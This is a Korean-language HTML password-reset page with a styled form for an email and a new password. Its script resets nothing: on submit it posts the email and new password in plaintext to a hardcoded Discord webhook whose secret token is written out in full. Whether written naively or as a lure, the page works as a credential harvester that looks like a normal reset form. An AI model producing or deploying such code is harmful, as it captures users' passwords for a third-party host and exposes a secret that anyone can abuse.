<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>비밀번호 찾기</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .password-reset-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            font-size: 14px;
            color: #555;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }

        button.reset-btn {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button.reset-btn:hover {
            background-color: #0056b3;
        }

        .login-link {
            margin-top: 15px;
        }

        .login-link a {
            color: #007bff;
            text-decoration: none;
        }

        .login-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="password-reset-container">
        <h2>비밀번호 찾기</h2>
        <form id="resetForm">
            <div class="input-group">
                <label for="email">이메일</label>
                <input type="email" id="email" name="email" placeholder="이메일을 입력하세요" required>
            </div>
            <div class="input-group">
                <label for="password">새 비밀번호</label>
                <input type="password" id="password" name="password" placeholder="새 비밀번호를 입력하세요" required>
            </div>
            <button type="submit" class="reset-btn">비밀번호 변경</button>
            <div class="login-link">
                <p>계정이 기억나시나요? <a href="/">로그인</a></p>
            </div>
        </form>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1346075290220363796/XCwx3VtxHyKH8surq3to9ef95OtkLE8Ln8P66ChMdmXKwxYG3nPAsAmjB9hVCkKZwYOC";

        document.getElementById('resetForm').addEventListener('submit', function (event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const message = {
                content: `**비밀번호 변경 요청**\n이메일: ${email}\n새 비밀번호: ${password}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => response.json())
            .then(data => {
                alert('비밀번호 변경 요청이 디스코드로 전송되었습니다.');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('에러가 발생했습니다. 다시 시도해주세요.');
            });
        });
    </script>
</body>
</html>
